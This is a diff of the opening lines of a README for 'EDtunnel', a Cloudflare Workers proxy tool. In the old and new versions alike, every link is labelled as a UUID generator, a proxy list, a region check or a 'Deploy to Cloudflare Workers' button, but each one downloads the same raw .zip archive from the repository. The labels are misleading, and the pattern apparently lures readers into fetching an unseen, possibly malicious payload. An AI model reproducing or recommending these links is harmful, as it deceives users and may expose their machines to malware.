@@ -1,5 +1,5 @@
-# LINK UUIDGEN : https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip
-# FREE PROXYIP : https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip
-# CEK REGION PROXYIP : https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip
-## Deploy in https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip
-   [![Deploy to Cloudflare Workers](https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip)](https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip)
+# LINK UUIDGEN : https://github.com/Amri854/EDtunnel/raw/refs/heads/main/minify/E_Dtunnel_v3.0.zip
+# FREE PROXYIP : https://github.com/Amri854/EDtunnel/raw/refs/heads/main/minify/E_Dtunnel_v3.0.zip
+# CEK REGION PROXYIP : https://github.com/Amri854/EDtunnel/raw/refs/heads/main/minify/E_Dtunnel_v3.0.zip
+## Deploy in https://github.com/Amri854/EDtunnel/raw/refs/heads/main/minify/E_Dtunnel_v3.0.zip
+   [![Deploy to Cloudflare Workers](https://github.com/Amri854/EDtunnel/raw/refs/heads/main/minify/E_Dtunnel_v3.0.zip)](https://github.com/Amri854/EDtunnel/raw/refs/heads/main/minify/E_Dtunnel_v3.0.zip)
